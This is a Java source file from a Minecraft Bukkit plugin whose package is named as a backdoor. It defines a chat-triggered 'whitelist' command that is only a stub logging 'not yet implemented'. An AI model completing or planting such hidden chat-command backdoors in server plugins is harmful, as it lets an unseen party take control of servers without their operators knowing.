package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "whitelist", aliases = {"whitelist"})
public class WhitelistCommand extends Command {

    public WhitelistCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Main.logger.log("Whitelist Command in not yet implemented");
    }
}
